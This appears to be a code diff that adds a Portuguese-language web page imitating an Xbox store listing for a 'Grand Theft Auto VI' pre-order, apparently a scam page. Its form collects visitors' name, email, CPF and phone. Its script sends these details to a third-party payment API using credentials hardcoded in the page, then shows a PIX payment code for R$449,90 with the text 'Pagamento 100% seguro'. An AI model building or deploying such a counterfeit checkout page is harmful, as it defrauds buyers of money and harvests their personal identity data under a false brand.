@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Grand Theft Auto VI - Pré-encomenda | Xbox</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { margin:0; padding:0; box-sizing:border-box }
+body {
+  font-family: 'Inter', -apple-system, sans-serif;
+  background: #e6e6e6;
+  color: #000;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+.container {
+  width: 100%;
+  max-width: 620px;
+  padding: 20px;
+}
+.top-bar {
+  background: #000;
+  margin: -20px -20px 0;
+  padding: 14px 20px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.top-bar svg { width: 24px; height: 24px; }
+.top-bar span { color: #fff; font-weight: 600; font-size: 16px; }
+.product-card {
+  background: #fff;
+  border-radius: 8px;
+  overflow: hidden;
+  margin-top: 20px;
+  box-shadow: 0 2px 8px rgba(0,0,0,.08);
+}
+.product-header {
+  display: flex;
+  gap: 16px;
+  padding: 24px;
+}
+.product-image {
+  width: 99px;
+  height: 144px;
+  border-radius: 4px;
+  flex-shrink: 0;
+  overflow: hidden;
+}
+.product-image img { width: 100%; height: 100%; object-fit: cover; }
+.product-info { flex: 1; }
+.product-info h1 { font-size: 20px; font-weight: 700; margin-bottom: 2px; }
+.product-info .publisher { font-size: 13px; color: #666; margin-bottom: 8px; }
+.price-row { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; }
+.price-current { font-size: 22px; font-weight: 800; }
+.price-plus { font-size: 13px; color: #666; font-weight: 400; }
+.badge { display: inline-flex; align-items: center; gap: 4px; background: #f0f0f0; border-radius: 4px; padding: 4px 10px; font-size: 12px; color: #333; }
+.platform-section {
+  padding: 0 24px 16px;
+}
+.platform-section h2 { font-size: 13px; font-weight: 600; color: #333; margin-bottom: 8px; }
+.platform-list { list-style: none; display: flex; gap: 16px; }
+.platform-list li { display: flex; align-items: center; gap: 6px; font-size: 13px; color: #000; }
+.platform-list svg { width: 18px; height: 18px; flex-shrink: 0; }
+.description-section {
+  padding: 0 24px 20px;
+  border-bottom: 1px solid #e6e6e6;
+}
+.description-section p { font-size: 13px; line-height: 1.6; color: #333; }
+.action-panel {
+  padding: 16px 24px;
+  display: flex;
+  gap: 8px;
+  flex-wrap: wrap;
+  align-items: center;
+}
+.btn-primary {
+  background: #107C10;
+  color: #fff;
+  border: none;
+  padding: 12px 28px;
+  border-radius: 4px;
+  font-size: 15px;
+  font-weight: 700;
+  font-family: inherit;
+  cursor: pointer;
+  transition: all .2s;
+}
+.btn-primary:hover { background: #0d6b0d; }
+.btn-primary:disabled { opacity: .5; cursor: not-allowed; }
+.btn-secondary {
+  background: transparent;
+  color: #000;
+  border: 1px solid #ccc;
+  padding: 12px 20px;
+  border-radius: 4px;
+  font-size: 13px;
+  font-weight: 600;
+  font-family: inherit;
+  cursor: pointer;
+  transition: all .2s;
+}
+.btn-secondary:hover { border-color: #999; background: #f5f5f5; }
+.form-card {
+  background: #fff;
+  border-radius: 8px;
+  padding: 24px;
+  margin-top: 12px;
+  box-shadow: 0 2px 8px rgba(0,0,0,.08);
+}
+.form-card h3 { font-size: 15px; font-weight: 700; margin-bottom: 16px; }
+.form-group { margin-bottom: 14px; }
+.form-group label { display: block; font-size: 12px; font-weight: 600; color: #555; margin-bottom: 4px; }
+.form-group input {
+  width: 100%;
+  padding: 10px 12px;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+  font-size: 14px;
+  font-family: inherit;
+  transition: border-color .2s;
+  outline: none;
+}
+.form-group input:focus { border-color: #107C10; box-shadow: 0 0 0 2px rgba(16,124,16,.1); }
+.form-group input::placeholder { color: #999; }
+.pix-section {
+  display: none;
+  background: #fff;
+  border-radius: 8px;
+  padding: 24px;
+  margin-top: 12px;
+  text-align: center;
+  box-shadow: 0 2px 8px rgba(0,0,0,.08);
+  animation: fadeIn .4s ease;
+}
+.pix-section.active { display: block; }
+.pix-section .check-icon {
+  width: 48px; height: 48px;
+  background: #107C10;
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  margin: 0 auto 12px;
+  color: #fff; font-size: 24px;
+}
+.pix-section h3 { font-size: 18px; font-weight: 700; margin-bottom: 4px; }
+.pix-section p { font-size: 13px; color: #666; margin-bottom: 16px; }
+.qr-box {
+  width: 180px; height: 180px;
+  margin: 0 auto 12px;
+  background: #fff;
+  border: 1px solid #e6e6e6;
+  border-radius: 8px;
+  display: flex; align-items: center; justify-content: center;
+  padding: 8px;
+}
+.qr-box img { width: 100%; height: 100%; }
+.pix-code {
+  background: #f5f5f5;
+  border: 1px dashed #ccc;
+  border-radius: 6px;
+  padding: 10px;
+  font-size: 11px;
+  color: #666;
+  word-break: break-all;
+  font-family: monospace;
+  cursor: pointer;
+  transition: all .2s;
+  position: relative;
+}
+.pix-code:hover { border-color: #107C10; }
+.pix-code .copy-hint {
+  position: absolute;
+  top: -8px; right: 8px;
+  background: #107C10; color: #fff;
+  font-size: 9px; padding: 2px 8px;
+  border-radius: 3px; opacity: 0;
+  transition: opacity .2s;
+  font-family: 'Inter', sans-serif;
+}
+.pix-code:hover .copy-hint { opacity: 1; }
+.legal-section {
+  padding: 16px 24px;
+  font-size: 11px;
+  color: #888;
+  line-height: 1.5;
+}
+.legal-section a { color: #107C10; text-decoration: none; }
+.legal-section a:hover { text-decoration: underline; }
+.rating-section {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 12px 24px;
+  border-top: 1px solid #e6e6e6;
+}
+.rating-section img { width: 40px; height: 40px; }
+.rating-section .rating-text { font-size: 12px; color: #555; }
+.rating-section .rating-text strong { display: block; font-size: 13px; color: #000; }
+.copied-msg {
+  position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%);
+  background: #107C10; color: #fff; padding: 10px 20px;
+  border-radius: 6px; font-weight: 600; font-size: 13px;
+  opacity: 0; transition: opacity .3s; pointer-events: none; z-index: 100;
+}
+.copied-msg.show { opacity: 1; }
+.loading { display: inline-block; width: 18px; height: 18px; border: 2px solid rgba(255,255,255,.3); border-top-color: #fff; border-radius: 50%; animation: spin .6s linear infinite; vertical-align: middle; margin-right: 6px; }
+@keyframes spin { to { transform: rotate(360deg) } }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(8px) } to { opacity: 1; transform: translateY(0) } }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="top-bar">
+    <svg viewBox="0 0 24 24" fill="#fff"><path d="M0 0v24h24V0H0zm11.52 19.12l-1.42-4.67-4.49.01 3.64 2.63-1.39 4.68 3.65-2.65h.01zm4.57-7.92l-1.42 4.68 3.64-2.65 3.65 2.65-1.39-4.68 3.64-2.63-4.49-.01-1.42-4.67-1.42 4.67-4.49.01 3.64 2.63z"/></svg>
+    <span>Xbox</span>
+  </div>
+
+  <div class="product-card">
+    <div class="product-header">
+      <div class="product-image">
+        <img src="https://store-images.s-microsoft.com/image/apps.47529.14542422611289128.2df5f2de-8c5b-4180-adca-60031b66133a.38261ecb-5ee5-4e30-8586-070dd6251f17?q=90&w=99&h=144" alt="Grand Theft Auto VI">
+      </div>
+      <div class="product-info">
+        <h1>Grand Theft Auto VI</h1>
+        <p class="publisher">Publicado por Rockstar Games</p>
+        <div class="price-row">
+          <span class="price-current">R$449,90</span>
+          <span class="price-plus">+</span>
+        </div>
+        <span class="badge">Pré-encomenda</span>
+      </div>
+    </div>
+
+    <div class="platform-section">
+      <h2>Jogar com</h2>
+      <ul class="platform-list">
+        <li>
+          <svg viewBox="0 0 2048 2048" fill="#107C10"><path d="M256 320q0-26 19-45t45-19q26 0 45 19t19 45q0 26-19 45t-45 19q-26 0-45-19t-19-45zm1792 1523q0 57-19 103t-69 78q-15 10-34 17t-38 7q-35 0-64-25t-57-57-53-64-55-42q-9-4-21-4t-24-1h-236q-23 0-44 14t-41 36-40 46-41 47-44 35-48 15q-20 0-37-6t-34-17q-48-32-68-78t-21-102v-24q0-12 2-24 1-23 9-58t21-76 29-83 34-82 33-70 32-51q0-36 31-56 13-9 37-16t50-13 52-9 42-3q16 0 27 2t20 6 20 10 23 13h164q15-7 24-13t17-10 20-6 29-2q18 0 43 3t50 8 49 13 39 17q14 10 21 24t10 32q12 12 27 39t30 63 31 75 28 78 22 68 13 50q9 47 9 93zm-128 2q0-35-8-73-5-24-16-61t-25-76-29-75-26-59l-8-16q-4-8-9-15-7-8-12-12t-9-8-9-10-8-18q-21-7-42-9t-45-5q-14 6-22 11t-18 11-19 8-28 3h-166q-17 0-27-3t-20-7-18-11-22-12q-23 0-44 4t-44 10q-2 20-14 27t-23 21q-5 7-8 14t-8 16q-15 31-33 76t-34 93-27 94-11 80q0 20 4 39t21 32q28-25 48-49t38-45 36-38 41-29 55-19 77-7h192q46 0 78 7t55 19 40 30 34 38 38 44 50 49q17-11 21-30t4-39zM896 1553V128H128v1792h128v-896h128v896h455q12 68 52 128H0V0h1024v1270q-10 14-14 28t-11 28l-8 14q-4 7-9 14-28 47-48 97t-38 102zm608-82q14 0 23 9t9 23q0 14-9 23t-23 9q-14 0-23-9t-9-23q0-14 9-23t23-9z"/></svg>
+          Xbox Series X|S
+        </li>
+      </ul>
+    </div>
+
+    <div class="description-section">
+      <p>Compre antes de 20 de novembro para receber:<br><br>
+      - O Pacote Vintage Vice City<br>
+      - Um mês de GTA+<br><br>
+      Grand Theft Auto VI é uma experiência para um jogador. Vice City, EUA.<br><br>
+      Jason e Lucia sempre souberam que tudo estava contra eles. Mas, depois que um serviço simples dá errado, eles vão parar no lado mais sombrio do lugar mais ensolarado dos Estados Unidos, em meio a uma conspiração criminosa se estendendo por todo o estado de Leonida — e são forçados a depender um do outro mais do que nunca para saírem dessa vivos.</p>
+    </div>
+
+    <div class="action-panel">
+      <button class="btn-primary" id="btnPreorder">PRÉ-ENCOMENDA</button>
+      <button class="btn-secondary" onclick="window.location.href='xbox_clone/index.html'">MOSTRAR NA LOJA</button>
+    </div>
+
+    <div class="rating-section">
+      <img src="https://store-images.s-microsoft.com/image/global.43047.image.d24f185e-55d4-44ac-9481-3f7086d7c404.6c93ea88-199e-434d-8b34-f069a70b9d07?q=100&w=50&h=50" alt="18+">
+      <div class="rating-text">
+        <strong>18 anos</strong>
+        Violência Extrema, Conteúdo Sexual, Drogas Lícitas
+      </div>
+    </div>
+
+    <div class="legal-section">
+      <p>&copy; 1997–2026. Rockstar Games Inc. Rockstar Games, Grand Theft Auto, Grand Theft Auto VI, VI, R* e logotipos relacionados são marcas comerciais da Take-Two Interactive Software, Inc.</p>
+      <p style="margin-top:8px">+ Ofertas em compras no aplicativo.</p>
+    </div>
+  </div>
+
+  <div class="form-card" id="formCard">
+    <h3>Informações para pré-encomenda</h3>
+    <form id="checkoutForm">
+      <div class="form-group">
+        <label for="name">Nome completo</label>
+        <input type="text" id="name" placeholder="Seu nome" required>
+      </div>
+      <div class="form-group">
+        <label for="email">E-mail</label>
+        <input type="email" id="email" placeholder="seu@email.com" required>
+      </div>
+      <div class="form-group">
+        <label for="cpf">CPF</label>
+        <input type="text" id="cpf" placeholder="000.000.000-00" required maxlength="14">
+      </div>
+      <div class="form-group">
+        <label for="phone">Telefone</label>
+        <input type="tel" id="phone" placeholder="(51) 12345-6789" required maxlength="15">
+      </div>
+      <button type="submit" class="btn-primary" id="btnPay" style="width:100%;margin-top:4px">
+        <span id="btnText">GERAR PIX - R$ 449,90</span>
+      </button>
+    </form>
+  </div>
+
+  <div class="pix-section" id="pixSection">
+    <div class="check-icon">&#10003;</div>
+    <h3>Pré-encomenda confirmada!</h3>
+    <p>Pague o PIX abaixo para garantir sua cópia</p>
+    <div class="qr-box" id="qrContainer">
+      <div style="color:#888;font-size:12px">Carregando QR Code...</div>
+    </div>
+    <div class="pix-code" id="pixCodeBox" onclick="copyPix()">
+      <span id="pixCodeText">Carregando...</span>
+      <span class="copy-hint">Copiar</span>
+    </div>
+    <p style="font-size:11px;color:#888;margin-top:8px">Pagamento processado via SyncPay</p>
+  </div>
+
+  <p style="font-size:10px;color:#999;text-align:center;margin-top:16px">Pagamento 100% seguro &bull; Confirmação instantânea via PIX</p>
+</div>
+
+<div class="copied-msg" id="copiedMsg">Código PIX copiado!</div>
+
+<script>
+const API_BASE = 'https://api.syncpayments.com.br/api/partner/v1';
+const CLIENT_ID = '2ca9e7c7-0677-44b9-abe3-3c1bfd4fa77d';
+const CLIENT_SECRET = '5467e5a0-744e-445d-a106-c3adb2953079';
+let accessToken = null;
+
+function maskCPF(v) {
+  return v.replace(/\D/g,'').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d{1,2})$/,'$1-$2');
+}
+function maskPhone(v) {
+  return v.replace(/\D/g,'').replace(/(\d{2})(\d)/,'($1) $2').replace(/(\d{4,5})(\d{4})$/,'$1-$2');
+}
+document.getElementById('cpf').addEventListener('input', function(){ this.value = maskCPF(this.value); });
+document.getElementById('phone').addEventListener('input', function(){ this.value = maskPhone(this.value); });
+
+async function getToken() {
+  const res = await fetch(API_BASE+'/auth-token', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ client_id: CLIENT_ID, client_secret: CLIENT_SECRET })
+  });
+  if (!res.ok) throw new Error('Falha ao autenticar');
+  return (await res.json()).access_token;
+}
+
+async function createPix(name, email, cpf, phone, amount) {
+  const res = await fetch(API_BASE+'/cash-in', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Accept': 'application/json',
+      'Authorization': 'Bearer '+accessToken
+    },
+    body: JSON.stringify({
+      amount: amount,
+      description: 'GTA VI - Xbox Pré-encomenda',
+      client: { name, email, cpf: cpf.replace(/\D/g,''), phone: phone.replace(/\D/g,'') }
+    })
+  });
+  if (!res.ok) throw new Error('Falha ao gerar PIX');
+  return await res.json();
+}
+
+document.getElementById('checkoutForm').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const btn = document.getElementById('btnPay');
+  const bt = document.getElementById('btnText');
+  const name = document.getElementById('name').value.trim();
+  const email = document.getElementById('email').value.trim();
+  const cpf = document.getElementById('cpf').value.trim();
+  const phone = document.getElementById('phone').value.trim();
+  if (!name || !email || !cpf || !phone) return;
+  btn.disabled = true;
+  bt.innerHTML = '<span class="loading"></span> Gerando PIX...';
+  try {
+    accessToken = await getToken();
+    const result = await createPix(name, email, cpf, phone, 449.90);
+    document.getElementById('pixCodeText').textContent = result.pix_code;
+    const qrC = document.getElementById('qrContainer');
+    qrC.innerHTML = '<img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data='+encodeURIComponent(result.pix_code)+'" alt="QR Code PIX">';
+    document.getElementById('pixSection').classList.add('active');
+    document.getElementById('formCard').style.display = 'none';
+    document.getElementById('pixSection').scrollIntoView({ behavior: 'smooth', block: 'center' });
+    bt.textContent = 'PIX GERADO!';
+  } catch(err) {
+    bt.textContent = err.message+' - Tente novamente';
+    btn.disabled = false;
+    setTimeout(() => { bt.textContent = 'GERAR PIX - R$ 449,90'; }, 3000);
+  }
+});
+
+async function copyPix() {
+  const text = document.getElementById('pixCodeText').textContent;
+  if (!text || text === 'Carregando...') return;
+  try {
+    await navigator.clipboard.writeText(text);
+    document.getElementById('copiedMsg').classList.add('show');
+    setTimeout(() => document.getElementById('copiedMsg').classList.remove('show'), 2500);
+  } catch {}
+}
+</script>
+
+</body>
+</html>
